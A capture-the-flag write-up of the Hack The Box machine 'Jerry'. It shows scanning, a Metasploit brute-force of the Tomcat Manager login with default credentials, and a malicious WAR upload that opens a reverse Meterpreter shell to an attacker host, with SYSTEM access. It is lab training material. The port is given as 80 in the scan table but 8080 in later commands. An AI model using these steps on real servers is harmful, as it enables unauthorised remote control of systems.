# Jerry - Hack The Box

## Machine Information

| Attribute | Value |
|-----------|--------|
| Name | Jerry |
| Difficulty | Easy |
| OS | Windows |
| Platform | Hack The Box |

---

# Summary

Jerry is an Easy Windows machine focused on exploiting **Apache Tomcat Manager**. After discovering the Tomcat Manager interface, valid credentials were identified using a Metasploit auxiliary scanner. Those credentials were then used to deploy a malicious WAR application, resulting in a **Meterpreter** session running as **NT AUTHORITY\SYSTEM**, allowing immediate access to both flags without requiring privilege escalation.

---

# Initial Enumeration

## Nmap Scan

The first step was to enumerate the target for exposed services.

```bash
nmap -sS -sV -sC -p- --min-rate 5000 10.129.136.9 -oN nmap
```

<img width="955" height="266" alt="image" src="https://github.com/user-attachments/assets/18040bd2-0781-447a-b495-7452c370d491" />



### Results

| Port | Service | Version |
|------|----------|----------|
| 80 | HTTP | Apache Tomcat 7.0.88 |

Since the only exposed service was Apache Tomcat, the attack focused entirely on the web application.

---

# Web Enumeration

Browsing to the target revealed the default Apache Tomcat page.

Directory enumeration was performed using Gobuster:

```bash
gobuster dir -u http://10.129.136.9:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="958" height="502" alt="image" src="https://github.com/user-attachments/assets/14569e19-a67f-4c5f-9393-5739549330eb" />


Interesting discovery:

```
/manager
```

Accessing `/manager` presented the **Apache Tomcat Manager** login page.

---

# Credential Discovery

Instead of manually testing credentials, the Metasploit auxiliary scanner was used.

Module:

```text
auxiliary/scanner/http/tomcat_mgr_login
```

<img width="956" height="280" alt="image" src="https://github.com/user-attachments/assets/b075c3a1-ccfd-4e7c-9374-e1247530e179" />


Configuration:

```text
set RHOSTS 10.129.136.9
set RPORT 8080
run
```

Valid credentials discovered:

```
Username: tomcat
Password: s3cret
```

---

# Initial Access

With valid credentials identified, another Metasploit module was used to deploy a malicious WAR file.

Module:

```text
exploit/multi/http/tomcat_mgr_upload
```

<img width="959" height="547" alt="image" src="https://github.com/user-attachments/assets/bacc1397-9a01-4f1e-b489-a919113ee1c5" />


Configuration:

```text
set HttpUsername tomcat
set HttpPassword s3cret
set RHOSTS 10.129.136.9
set RPORT 8080
set LHOST 10.10.14.65
set LPORT 4444
run
```

The module authenticated successfully, uploaded the malicious WAR application, and executed it automatically, returning a Meterpreter session.

---

# Shell Access

A Windows command shell was spawned from Meterpreter.

```text
meterpreter > shell
```

Privilege verification:

```cmd
whoami
```

Output:

```text
nt authority\system
```

<img width="958" height="167" alt="image" src="https://github.com/user-attachments/assets/199cf4ff-a0fd-49f8-a92a-fd6fe3feb4fc" />



Since the Tomcat service was running as **SYSTEM**, no privilege escalation was required.

---

# Flags

## User Flag

Navigate to the user's Desktop and read the flag.

```cmd
type user.txt
```

---

## Root Flag

Navigate to the Administrator's Desktop and read the flag.

```cmd
type root.txt
```

---

# Attack Path

1. Perform initial enumeration with Nmap.
2. Identify Apache Tomcat 7.0.88 running on port 80.
3. Enumerate directories using Gobuster.
4. Discover the `/manager` endpoint.
5. Use `tomcat_mgr_login` to identify valid Tomcat credentials.
6. Authenticate to Tomcat Manager.
7. Use `tomcat_mgr_upload` to deploy a malicious WAR application.
8. Receive a Meterpreter session.
9. Spawn a command shell.
10. Verify execution as **NT AUTHORITY\SYSTEM**.
11. Read both flags.

---

# Skills Learned

- Apache Tomcat enumeration
- Directory enumeration with Gobuster
- Identifying Tomcat Manager
- Credential discovery using Metasploit auxiliary modules
- Deploying malicious WAR applications
- Gaining remote code execution through Tomcat Manager
- Working with Meterpreter sessions
- Windows post-exploitation
- Privilege verification using `whoami`
```
